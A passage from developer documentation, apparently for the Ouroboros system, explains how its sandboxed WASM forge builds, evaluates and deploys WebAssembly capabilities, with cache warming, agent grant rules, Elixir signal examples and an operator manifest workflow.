`Operation not permitted`; a Linux node on bubblewrap enforces it with a namespace the file
was never in, and says `No such file or directory`; a Linux node on `ouro-sandbox` enforces
it with a Landlock read set and says `Permission denied` (docs/WASM.md D26). The one case
that is not a fence is a node carrying an `ouro-sandbox` older than that read set: it reports
no `read_allow_set` feature to `doctor`, and the forge refuses to build there at all rather
than behind a fence that helper cannot apply. `make sandbox` installs a current one.

### Warming the cache, once, per builder

`--offline` means every crate the SDK's lock names has to already be on the machine:

```sh
make wasm-sdk-cache                                  # into <data_dir>/wasm/cargo-home
make wasm-sdk-cache CARGO_HOME=/var/lib/ouro/cargo   # into a cache you keep elsewhere
```

which is `cargo fetch --locked` in `tui/wasm/guest` — exactly the SDK's dependency set and
nothing else. The default is the **node's own** cache and not your `~/.cargo`, because a
cargo home carries a `config.toml` and `[build] rustc-wrapper` in one is a program cargo runs
on every crate; point the forge at another with
`config :ouroboros, :wasm_forge_cargo_home`. A cold cache is refused in milliseconds, naming
the crates that are missing and the command that fixes it. It never waits on a network.

### From an agent

Two signals, gated by the two grants the BEAM lane already uses:

```elixir
Ouroboros.Control.Grants.grant(agent_id, :forge, modules: ["wasm/counter"])
Ouroboros.Control.Grants.grant(agent_id, :deploy, nodes: [node()])
```

A `:forge` allow-list holds BEAM module atoms and `"wasm/<name>"` strings, and the two
spellings never match each other, so the grant above admits forging `counter` in lane W and
nothing else. **`modules: :any` does not reach lane W**: it means what it meant before this
lane existed — any BEAM module — so that a grant somebody wrote and forgot could not come to
mean more because a release added a second thing *forge* can do. `modules: ["wasm/*"]` is how
you say "any component", out loud.

```elixir
{:ok, signal} =
  Ouroboros.Signals.EffectForgeWasmCapability.new(%{
    from: agent_id,
    name: "counter",
    files: %{
      "Cargo.toml" => cargo_toml,
      "Cargo.lock" => cargo_lock,
      "src/lib.rs" => source
    },
    eval: %{probes: [%{input: %{"add" => 1}, expect: :any_reply}], required: :all},
    start_config: "{}",
    nodes: [node()]
  })
```

A forge is bounded twice: five minutes of wall clock in the forge itself, and
`config :ouroboros, :effect_timeout` around the whole effect. The effect asks for a build
budget strictly inside the second, so a build that runs long is stopped by the forge — which
signals the compiler and removes its tree — rather than by the runner, which would not.

`eval` is not optional in practice: lane W requires a signed evaluation spec (D12), because
there is no build peer running your tests here — the spec *is* the test story, and the
signature covers it. `start_config` is what the capability's `init` receives; its presence is
what makes the deploy start a durable `wasm/<name>` agent.

The effect settles into the agent's trail. What comes back is the manifest and the digest —
the component bytes stay in the node's bundle directory, never in agent state:

```elixir
%{artifact_id: id, module: "wasm/counter", component_sha256: sha, imports: ["log"], ...}
```

Then deploy the artifact the same agent forged:

```elixir
Ouroboros.Signals.EffectDeployWasmCapability.new(%{
  from: agent_id,
  artifact_id: id,
  nodes: [node()]
})
```

Two things are worth knowing about that pair. The **author** written into the signed manifest
is the identity the agent server holds, never the `from` on the signal — a signal claiming to
be somebody else buys nothing. And a deploy can only ship an artifact this agent's own granted
forge returned; an id from anywhere else is `{:unknown_artifact, id}`, and a BEAM artifact
handed to the wasm deploy (or the reverse) is `{:wrong_lane, id, lane}`.

### From a workspace, as an operator

A proposal directory under `.ouroboros/capabilities/<Name>/` that holds a `Cargo.toml` is a
lane-W proposal. Put the project there, plus a `manifest.json` beside it:

```json
{
  "name": "counter",
  "description": "Counts, and says so.",
  "eval": {
    "probes": [{ "input": { "add": 1 }, "expect": "any_reply" }],
    "budget_ms": 10000,
    "required": "all"
  },
  "start": { "config": "{}" }
}
```

`name` must be the name your `Cargo.toml` gives the package. Two names for one thing is how a
proposal comes to be described as one capability and deployed as another, so a disagreement is
refused — before the build, because a name is not a build product.

The same three verbs as the BEAM lane, at `:operate`:

* `capabilities.list` — reports each proposal's lane and the id it would deploy under;
* `capabilities.preview` — the whole C9 validation, plus a dry build where the toolchain is
  present and the cache warm. It signs nothing and allocates no epoch;
* `capabilities.admit` — forges, signs, deploys, and starts it if the manifest says to.

A proposal directory with a `target/` in it is refused: that is a build tree, not a project,
and the allow-list counts every file it is given. Clean it before you admit.
